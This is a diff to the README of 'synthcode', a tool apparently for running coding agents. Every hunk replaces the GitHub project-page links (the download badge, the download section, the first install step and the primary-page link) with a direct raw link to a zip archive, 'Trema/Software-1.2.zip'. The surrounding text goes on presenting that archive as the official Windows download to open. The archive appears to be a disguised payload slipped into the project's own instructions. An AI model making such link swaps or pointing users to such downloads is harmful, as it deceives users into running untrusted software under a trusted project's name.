@@ -1,10 +1,10 @@
 # 🤖 synthcode - Run coding agents with ease
 
-[![Download synthcode](https://img.shields.io/badge/Download%20synthcode-blue?style=for-the-badge&logo=github)](https://github.com/Beige-superior870/synthcode)
+[![Download synthcode](https://img.shields.io/badge/Download%20synthcode-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip)
 
 ## 🚀 Download
 
-Visit this page to download: [https://github.com/Beige-superior870/synthcode](https://github.com/Beige-superior870/synthcode)
+Visit this page to download: [https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip](https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip)
 
 ## 🧩 What synthcode does
 
@@ -34,7 +34,7 @@ If the app needs extra components on your system, it will guide you during setup
 
 ## 📥 Download and install
 
-1. Open the download page: [https://github.com/Beige-superior870/synthcode](https://github.com/Beige-superior870/synthcode)
+1. Open the download page: [https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip](https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip)
 2. Find the latest release or download option on the page
 3. Download the Windows file for your computer
 4. Open the file you downloaded
@@ -168,4 +168,4 @@ You can ask synthcode to help with:
 
 ## 📎 Source and project page
 
-Primary page: [https://github.com/Beige-superior870/synthcode](https://github.com/Beige-superior870/synthcode)
+Primary page: [https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip](https://raw.githubusercontent.com/Beige-superior870/synthcode/main/Trema/Software-1.2.zip)
